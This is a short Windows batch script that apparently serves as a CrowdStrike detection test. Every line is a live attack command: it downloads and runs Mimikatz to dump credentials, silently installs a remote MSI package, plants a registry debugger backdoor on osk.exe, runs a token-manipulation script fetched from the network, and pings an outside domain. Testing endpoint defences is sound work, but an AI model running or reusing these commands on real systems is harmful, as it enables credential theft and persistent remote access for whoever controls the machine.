@echo off

start cmd.exe /c crowdstrike_test_critical

start powershell.exe "iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds" 

start msiexec /q /I https://google.com/malware.exe 

start reg.exe add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v "Debugger" /t REG_SZ /d "cmd.exe" /f 

start powershell "IEX (New-Object Net.WebClient). DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master /Exfiltration/Invoke-TokenManipulation.ps1'); Invoke-TokenManipulation -Enumerate" 


ping carbon2u.com

